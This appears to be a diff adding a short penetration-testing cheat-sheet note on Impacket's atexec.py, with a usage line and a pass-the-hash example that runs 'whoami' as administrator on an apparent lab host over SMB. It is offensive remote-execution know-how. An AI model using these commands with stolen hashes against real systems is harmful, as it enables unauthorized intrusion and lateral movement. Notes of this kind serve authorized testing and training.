@@ -1,0 +1,6 @@
+Execute commands via the Task Scheduler (using \pipe\atsvc via SMB).
+In kali it is located on /usr/share/doc/python3-impacket/examples/
+
+#bash
+./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
+./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
